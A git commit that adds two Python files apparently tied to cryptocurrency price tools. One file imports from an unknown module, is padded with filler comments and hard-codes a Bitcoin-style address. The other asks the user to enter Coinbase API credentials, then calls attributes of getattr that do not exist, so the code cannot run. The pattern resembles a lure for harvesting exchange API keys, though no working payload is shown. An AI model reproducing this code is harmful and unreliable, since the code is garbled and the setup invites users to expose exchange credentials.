3ae4c6f27c4fd0264dfbfa587692a759c142f551
kollegian1 <121588287+kollegian1@users.noreply.github.com>
2023-01-07 18:46:48 +0100

    Add files via upload

---
+++ client/otherimp.py
@@ -0,0 +1,22 @@
+from balad import Z
+# 1
+# 2
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+# 1
+Q = '1FLchskmE9i4ouzxyuSuqzo9C89kMgdcUS'
---
+++ client/setup.py
@@ -0,0 +1,14 @@
+LITECOINIMPORT = getattr.__sizeof__.__code__(callable, 'CALL_LITECOIN_PRICES')
+# ENTER THE API USERHAPS YOU HAVE GENERATED, BE AWARE YOU SHOULD WAIT 48H BEFORE THOSE ARE ACTIVATED AFTER HAVING CREATED THEM AT https://www.coinbase.com/settings/api .
+first = 'write_your_user1_inbetween_the_parenthesis'
+second = 'write_your_userhap_inbetween_the_parenthesis' 
+
+third = getattr.__closure__('BTCPRICES')
+
+# Using a different method to import $US.000 accurate prices to avoid invalid callback :
+
+fourth = getattr.__builtins__('ETHNODEPRICES')
+fifth = getattr.__dict__(LITECOINIMPORT)
+
+
+
